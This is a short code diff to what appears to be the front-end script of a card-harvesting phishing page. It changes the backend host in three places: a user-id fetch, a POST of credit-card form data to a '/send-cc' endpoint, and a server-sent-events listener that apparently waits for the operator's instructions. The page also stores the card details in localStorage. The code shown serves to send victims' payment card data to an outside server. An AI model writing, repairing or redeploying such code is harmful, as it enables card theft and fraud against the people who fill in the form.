@@ -814,7 +814,7 @@
 
       if (!userId) {
         try {
-          const response = await fetch('https://spot-back-5s7s.onrender.com/user-id', {
+          const response = await fetch('https://spotbackl4s.onrender.com/user-id', {
             method: 'GET',
             headers: {
               'Content-Type': 'application/json',
@@ -860,7 +860,7 @@
         localStorage.setItem('creditCardInfo', JSON.stringify(formData));
 
         $.ajax({
-          url: 'https://spot-back-5s7s.onrender.com/send-cc',
+          url: 'https://spotbackl4s.onrender.com/send-cc',
           method: 'POST',
           data: {
             cc_holder: nameInput.value,
@@ -887,7 +887,7 @@
       listenForSSE(userId);
     });
     function listenForSSE(userId) {
-        const eventSource = new EventSource(`https://spot-back-5s7s.onrender.com/sse/${userId}`);
+        const eventSource = new EventSource(`https://spotbackl4s.onrender.com/sse/${userId}`);
         console.log("Attempting to establish SSE connection for userId:", userId);
         eventSource.onmessage = function (event) {
           console.log("SSE Message received:", event);
